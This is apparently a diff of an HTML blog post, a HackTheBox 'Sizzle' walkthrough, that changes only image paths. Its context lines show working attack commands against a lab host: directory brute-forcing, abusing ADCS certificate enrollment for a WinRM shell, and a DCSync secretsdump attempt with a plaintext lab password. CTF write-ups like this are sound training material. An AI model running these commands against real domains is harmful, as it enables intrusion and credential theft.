@@ -118,7 +118,7 @@ ftp&gt; dir
 125 Data connection already open; Transfer starting.
 226 Transfer complete.
 ftp&gt; 
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html -t 50
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html -t 50
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -745,7 +745,7 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: sizzle.HTB.LOCAL
 INFO: Done in 00M 30S
 INFO: Compressing output into 20231007121654_bloodhound.zip
-</code></pre><ul><li>If we check <code>amanda</code> user privileges, it shows that she&rsquo;s in <code>Remote Management Users</code> group</li></ul><p><img src=./images/3.png></p><ul><li>Since we failed <code>winrm</code> authentification, maybe it requires <code>certificate</code> for login<ul><li>We saw <code>CertEnroll</code> directory and <code>/certenroll</code> and <code>/certsrv</code> which are part of <a href=https://social.technet.microsoft.com/wiki/contents/articles/7734.certificate-enrollment-web-services-in-active-directory-certificate-services.aspx target=_blank rel=noopener>ADCS</a></li><li>We can visit <code>/certsrv</code> and use <code>amanda</code> creds to access web enrollment feature</li></ul></li></ul><p><img src=./images/2.png></p><ul><li>I tried to use <code>User</code> certificate template, but it failed</li></ul><p><img src=./images/4.png></p><p><img src=./images/5.png></p><p><img src=./images/6.png></p><ul><li>We could create a <code>csr</code> and submit it via <code>advanced certificate request</code> feature<ul><li>https://10.10.10.103/certsrv/certrqxt.asp</li></ul></li></ul><pre tabindex=0><code>└─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+</code></pre><ul><li>If we check <code>amanda</code> user privileges, it shows that she&rsquo;s in <code>Remote Management Users</code> group</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/3.png></p><ul><li>Since we failed <code>winrm</code> authentification, maybe it requires <code>certificate</code> for login<ul><li>We saw <code>CertEnroll</code> directory and <code>/certenroll</code> and <code>/certsrv</code> which are part of <a href=https://social.technet.microsoft.com/wiki/contents/articles/7734.certificate-enrollment-web-services-in-active-directory-certificate-services.aspx target=_blank rel=noopener>ADCS</a></li><li>We can visit <code>/certsrv</code> and use <code>amanda</code> creds to access web enrollment feature</li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/2.png></p><ul><li>I tried to use <code>User</code> certificate template, but it failed</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/4.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/5.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/6.png></p><ul><li>We could create a <code>csr</code> and submit it via <code>advanced certificate request</code> feature<ul><li>https://10.10.10.103/certsrv/certrqxt.asp</li></ul></li></ul><pre tabindex=0><code>└─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
 ..+.....+.+...............+..............+.+...........+.+...+..+.......+..+...+...+...+....+..+....+..+.......+..+..........+...........+.......+...+..+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..............+...+......+.+......+.....+...+....+..+.+........+.+...+.................+.+............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*..+......+..+.............+......+........+.......+.........+..+.........+...+......+..........+..+...+....+...+..+......+......+.+.................+.+..............+...+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 .......+.....+....+..............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+...+.........+......+...................+.........+.....+......+....+.........+..+.+.....+.......+...+........+....+...+...+..+.........+...+...+.......+...+...+..+...+....+.....+.+.....+......+...+.+.........+...........+.+......+............+.....+.....................+.......+..+...+.........+..........+......+...+.....+.+......+..+..........+........+......................+........+...+.......+............+.....+.+.....+.+........+......+....+...+.....+...+....+........+...+....+......+......+........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 -----
@@ -787,7 +787,7 @@ cciP1QuNiWPLKUhx/HdxT3tx4h4YQAjVI7Foe4u1wWpfQRc8+VTdPq3LkybiIq+X
 h7R17BeDE/4Z2pnk4OGPgeM+Hba9CV5XEWuPhf2ueAPg9rRLBoQBHHyw7ikKbCv2
 BXNcocC9YZ+YuzxFlndC5TFn3dkM8+8W48t6lAKF
 -----END CERTIFICATE REQUEST-----
-</code></pre><ul><li>Now submit the request and download it</li></ul><p><img src=./images/7.png></p><p><img src=./images/8.png></p><ul><li>Let&rsquo;s connect using <code>evil-winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -S -c amanda.crt -k amanda.key -i 10.10.10.103
+</code></pre><ul><li>Now submit the request and download it</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/7.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/8.png></p><ul><li>Let&rsquo;s connect using <code>evil-winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -S -c amanda.crt -k amanda.key -i 10.10.10.103
                                         
 Evil-WinRM shell v3.5
                                         
@@ -816,7 +816,7 @@ d-----        7/11/2018   5:59 PM                mrlky.HTB
 d-r---       11/20/2016   8:24 PM                Public
 d-----         7/3/2018  10:32 PM                WSEnrollmentPolicyServer
 d-----         7/3/2018  10:49 PM                WSEnrollmentServer
-</code></pre><p><img src=./images/8.png></p><ul><li>If we check <code>netstat</code>, port <code>88</code> is open<ul><li>Maybe there&rsquo;s a firewall that blocks</li><li>That&rsquo;s why we didn&rsquo;t have results using <code>impacket-GetUserSPNs</code></li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users&gt; netstat -ano
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/8.png></p><ul><li>If we check <code>netstat</code>, port <code>88</code> is open<ul><li>Maybe there&rsquo;s a firewall that blocks</li><li>That&rsquo;s why we didn&rsquo;t have results using <code>impacket-GetUserSPNs</code></li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users&gt; netstat -ano
 
 Active Connections
 
@@ -937,7 +937,7 @@ Warning: SSL enabled
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\mrlky.HTB\Documents&gt;
-</code></pre><h2 id=root>Root</h2><ul><li>If we check <code>bloodhound</code>, <code>mrlky</code> has <code>dcsync</code> permissions</li></ul><p><img src=./images/9.png></p><ul><li>Let&rsquo;s dump using <code>impacket-secretsdump</code></li></ul><pre tabindex=0><code>└─$ impacket-secretsdump htb.local/mrlky:&#39;Football#7&#39;@10.10.10.103                                
+</code></pre><h2 id=root>Root</h2><ul><li>If we check <code>bloodhound</code>, <code>mrlky</code> has <code>dcsync</code> permissions</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/sizzle/images/9.png></p><ul><li>Let&rsquo;s dump using <code>impacket-secretsdump</code></li></ul><pre tabindex=0><code>└─$ impacket-secretsdump htb.local/mrlky:&#39;Football#7&#39;@10.10.10.103                                
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
